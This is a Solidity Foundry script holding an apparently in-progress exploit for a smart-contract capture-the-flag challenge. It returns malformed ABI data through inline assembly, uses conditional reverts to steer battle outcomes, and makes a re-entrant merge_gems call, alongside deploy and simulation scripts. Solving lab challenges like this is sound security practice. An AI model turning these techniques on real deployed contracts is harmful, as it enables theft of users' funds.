// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script, console} from "forge-std/Script.sol";
import {Counter} from "../src/Counter.sol";

enum GemStatus {
    ACTIVE,
    INACTIVE,
    DESTROYED
}

struct Gem {
    int256 health;
    int256 max_health;
    int256 attack;
    int256 hardness;
    GemStatus status;
}

struct Lunarian {
    int256 health;
    int256 attack;
    int256 rounds;
}

interface IMaster {
    function get_actions() external returns (uint8[] memory);
    function decide_continue_battle(uint256 round, uint256 lunarian_health) external returns (bool);
}

interface Iland_of_the_lustrous {
    function is_solved() external returns (bool);
    function register_master() external;
    function create_gem() external payable returns (Gem memory);
    function stage() external view returns (uint8);
    function master_addr() external view returns (address);
    function lunarian_addr() external view returns (address);
    function check_mm2(uint256 x) external view returns (int256);
    function battle(uint8[] memory actions) external;
    function merge_gems() external returns (Gem memory);
    function assign_gem(uint32) external;
    // function sequences() external returns(mapping(address=>uint32) memory);
    function gems(bytes32) external view returns(Gem memory);
    // function assigned_gems() external view returns(Gem memory);
    // function continued() external returns(mapping(address=>bool) memory);
}

contract Exploit {
    uint256 public exploitStage;

    Iland_of_the_lustrous public x;
    function stage1(address he) external payable {
        x = Iland_of_the_lustrous(he);
        x.register_master();
        Gem memory g = x.create_gem{value: 1 ether}();
        if (g.attack < 200) revert("NO ATTACK");
    }

    /*
    function get_actions() external view returns (uint256, uint256) {
        if (exploitStage == 0) {
            return (115792089237316195423570985008687907853269984665640564039457584007913129620544, 100);
        } else if (exploitStage == 1) {
            return (1, 1);
        } else {
            revert("NOPE!");
        }
    }
    */

   function stage2() external {
   }

   function get_gem(uint32 sequence) public view returns (Gem memory) {
       return x.gems(keccak256(abi.encodePacked(address(this), uint32(sequence))));
   }

   function get_actions() external view returns (uint8[] memory) {
        if (exploitStage == 0) {
            uint8[] memory actions = new uint8[](100);
            actions[0] = 1;
            actions[1] = 1;
            actions[2] = 1;
            actions[3] = 1;
            actions[4] = 1;
            return actions;
        } else if (exploitStage == 1) {
            // 초기화
            assembly {
                mstore(0x00, 115792089237316195423570985008687907853269984665640564039457584007913129620544)
                mstore(0x20, 200)
                return(0x0, 0x40)
            }
        } else if (exploitStage == 2) {
            // 승리 x 패배
            uint8[] memory actions = new uint8[](100);
            actions[0] = 1;
            actions[1] = 1;
            actions[2] = 1;
            actions[3] = 1;
            actions[4] = 1;
            return actions;
        } else if (exploitStage == 3) {
            // 승리
            uint8[] memory actions = new uint8[](100);
            actions[0] = 1;
            actions[1] = 1;
            actions[2] = 1;
            actions[3] = 1;
            actions[4] = 1;
            return actions;
        } else if (exploitStage == 4) {
            uint8[] memory actions = new uint8[](200);
            actions[0] = 1;
            actions[1] = 1;
            return actions;
        } else if (exploitStage == 5) {
            assembly {
                mstore(0x00, 115792089237316195423570985008687907853269984665640564039457584007913129620544)
                mstore(0x20, 300)
                return(0x0, 0x40)
            }
        } else {
            revert("NOPE!");
        }
    }

    function set_stage(uint256 stage) external {
        exploitStage = stage;
        if (exploitStage == 2) {
            Gem memory g = x.create_gem{value: 1 ether}();
        }
    }

    function assign_gem(uint32 sequence) external {
        x.assign_gem(sequence);
    }

    function decide_continue_battle(uint256 round, int256 lunarian_health) external returns (uint256) {
        if (exploitStage == 0) {
            revert("NOPE!");
        } else if (exploitStage == 2) {
            if (get_gem(1).health < 0) {
                revert("NONO");
            }
        } else if (exploitStage == 3) {
            revert("NOPE!");
        } else if (exploitStage == 4) {
            x.merge_gems();
        } else if (exploitStage == 200) {

        }
        return 1;
    }

    receive() external payable {}
}

contract XS1 is Script {
    function setUp() public {}

    function run() public {
        vm.startBroadcast();
        Iland_of_the_lustrous chall = Iland_of_the_lustrous(vm.envAddress("CHALL"));
        Exploit exp = new Exploit();
        console.log("exp address", address(exp));
        // while (true) {
        //     try exp.stage1{value: 1 ether}(address(chall)) {
        //         console.log(block.number);
        //         break;
        //     } catch Error(string memory reason) {
        //         console.log("sleep", reason);
        //         vm.sleep(1000 * 5);
        //     }
        // }
        // exp.stage1{value: 1 ether}(address(chall));
        vm.stopBroadcast();
    }
}

contract CounterScript is Script {
    function setUp() public {}

    function run() public {
        // vm.startBroadcast();

        Iland_of_the_lustrous chall = Iland_of_the_lustrous(vm.envAddress("CHALL"));

        for (uint i=1; i<20; i++) {
            int256 mm = chall.check_mm2(i);
            console.log(mm);
        }
        return;

        Exploit exp = new Exploit();
        while (true) {
            try exp.stage1{value: 1 ether}(address(chall)) {
                console.log(block.number);
                break;
            } catch Error(string memory reason) {
            }
        }

        // SHOULD BE HANDLED ON PYTHON
        address deployer = chall.lunarian_addr();
        vm.prank(deployer);
        uint8[] memory actions = new uint8[](100);
        if (false) {
            actions[0] = 2;
            actions[1] = 2;
            actions[2] = 2;
            actions[3] = 2;
            actions[4] = 2;
        }
        chall.battle(actions);
        ///////////

        exp.set_stage(1);
        uint8[] memory actions2 = new uint8[](200);
        if (true) { // bot wins
            actions2[0] = 2;
            actions2[1] = 2;
            actions2[2] = 2;
            actions2[3] = 2;
            actions2[4] = 2;
        }

        vm.prank(deployer);
        chall.battle(actions2);

        exp.set_stage(2);

        console.log("Stage", chall.stage());

        uint8[] memory actions3 = new uint8[](300);
        vm.prank(deployer);
        chall.battle(actions3);

        // vm.stopBroadcast();
    }
}